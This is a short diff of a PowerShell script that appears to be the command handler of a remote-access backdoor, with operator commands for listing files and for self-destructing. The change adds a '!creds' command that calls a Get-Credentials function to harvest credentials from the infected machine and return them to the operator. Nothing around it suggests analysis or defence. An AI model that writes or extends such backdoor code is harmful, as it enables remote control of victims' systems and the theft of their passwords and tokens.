@@ -223,6 +223,9 @@ Arch: $env:PROCESSOR_ARCHITECTURE${esc}[0m
                     elseif ($cmd -eq "!tree") {
                         $response = Tree-List
                     }
+                    elseif ($cmd -eq "!creds") {
+                        $response = Get-Credentials
+                    }
                     elseif ($cmd -eq "!die") {
                         $response = "[!] Self-destruct initiated..."
                         $outBytes = [Text.Encoding]::UTF8.GetBytes($response)
